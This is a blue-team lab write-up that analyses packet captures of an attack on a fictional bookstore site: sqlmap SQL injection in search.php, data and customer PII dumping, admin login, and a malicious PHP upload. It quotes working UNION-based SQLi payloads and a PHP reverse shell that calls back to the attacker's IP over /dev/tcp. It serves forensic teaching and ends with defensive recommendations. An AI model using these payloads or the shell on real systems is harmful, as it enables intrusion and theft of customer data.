How I approached it

I did not start by assuming the whole attack chain. The scenario only told me BookWorld had unusual database queries and resource usage. So my first job was to find which conversation was abnormal, then follow that conversation through HTTP requests, SQL Injection payloads, extracted data, admin login and upload activity.

The main pattern became clear after pivoting on 111.224.250.131. The traffic volume was high, the requests were web-focused, the User-Agent exposed sqlmap, and the same source later used dumped credentials to access the admin dashboard.

Working conclusion: 111.224.250.131 exploited SQL Injection in search.php, dumped database content, recovered admin:admin123!, logged into the admin panel and uploaded NVri2vhp.php, a PHP reverse shell attempt pointing back to the attacker.

6. SQL Injection activity with sqlmap

While reviewing HTTP traffic from 111.224.250.131, I found repeated requests targeting /search.php?search=. The User-Agent made the tool identification straightforward.

User-Agent: sqlmap/1.8.3#stable (https://sqlmap.org)

The URI patterns contained SQLi indicators such as UNION, SELECT, CHAR(), CASE WHEN and INFORMATION_SCHEMA. At that point, I treated search.php as the vulnerable script and search as the vulnerable parameter.

Confirmed attack vector: SQL Injection in the search parameter of search.php.

7. First SQL Injection attempt

The first decoded SQL Injection attempt was a basic boolean test:

/search.php?search=book and 1=1; -- -

This kind of request does not dump data yet. I read it as the attacker checking whether the parameter could be manipulated before moving to heavier enumeration.

8. Database enumeration

After the initial test, the attacker moved to database enumeration using INFORMATION_SCHEMA.SCHEMATA. This is where the request started to look like automated sqlmap extraction.

/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -

The hex values were markers used by sqlmap to locate extracted data inside the HTTP response.

HexDecoded marker
0x7178766271qxvbq
0x7a76676a636bzvgjck
0x7176706a71qvpjq
What I thought here: once I saw INFORMATION_SCHEMA and sqlmap markers, I stopped reading this as a manual test. This was automated database extraction.

Book data disclosure

Packet 1663 contained a UNION-based SQL Injection payload extracting id and title from bookworld_db.books.

/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,title)),0x7176706a71) FROM bookworld_db.books-- -

The response exposed book records such as The Great Gatsby, 1984, To Kill a Mockingbird and other titles.

Customer PII disclosure

The attacker also extracted customer records from bookworld_db.customers. This is the point where the incident became more than a web bug; customer PII was exposed.

10. Directory enumeration with Gobuster

Around packet 1681, the attacker began directory enumeration with Gobuster and discovered /admin/. This became important later because the SQLi had already exposed admin credentials.

/admin/

At this stage, the attack path made sense: dump admin credential first, discover admin panel, then attempt login.

11. Successful admin login

After dumping admin:admin123!, the attacker submitted login requests to the admin panel. The successful chain was visible in the response codes: 302 Found after login, then 200 OK for the dashboard.

What I thought here: a decoded credential is not enough by itself. The 302 redirect and then 200 OK dashboard response proved the credential was actually used successfully.

12. Malicious PHP upload

After accessing the admin dashboard, the attacker uploaded a PHP file through /admin/index.php. The upload was suspicious because the file extension was executable server-side code, not a normal image or document.

Content-Disposition: form-data; name="fileToUpload"; filename="NVri2vhp.php"
Content-Type: application/x-php

The uploaded PHP contained a reverse shell attempt back to the attacker:

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>

The server confirmed the upload:

The file NVri2vhp.php has been uploaded.

Uploaded file verification

The attacker then accessed /admin/uploads/. The server returned an Apache directory listing showing the uploaded PHP file.

<title>Index of /admin/uploads</title>
<a href="NVri2vhp.php">NVri2vhp.php</a>
Post-exploitation attempt: the attacker uploaded a PHP reverse shell and verified that the file existed in a web-accessible directory.

I did not claim the reverse shell fully executed unless the PCAP showed the callback clearly. What the capture does prove is upload, web-accessible placement and reverse shell intent.

15. Defensive notes

  • Use parameterized queries / prepared statements for search.php.
  • Block or alert on obvious sqlmap User-Agent strings and SQLi keywords in request URIs.
  • Do not expose admin paths without stronger authentication and monitoring.
  • Block upload of executable file types such as .php, .phtml and .phar.
  • Store uploaded files outside the web root.
  • Disable script execution and directory listing in upload directories.

Lessons learned

This lab showed why I should not jump directly to the final exploit. The full story came from a chain: conversation statistics, HTTP methods, sqlmap User-Agent, SQLi payloads, extracted credentials, admin response codes and file upload evidence.

The most important habit is to match each conclusion with the packet that proves it. For example, admin:admin123! was not just found in a response; the later 302 and 200 OK responses showed it was actually used successfully.
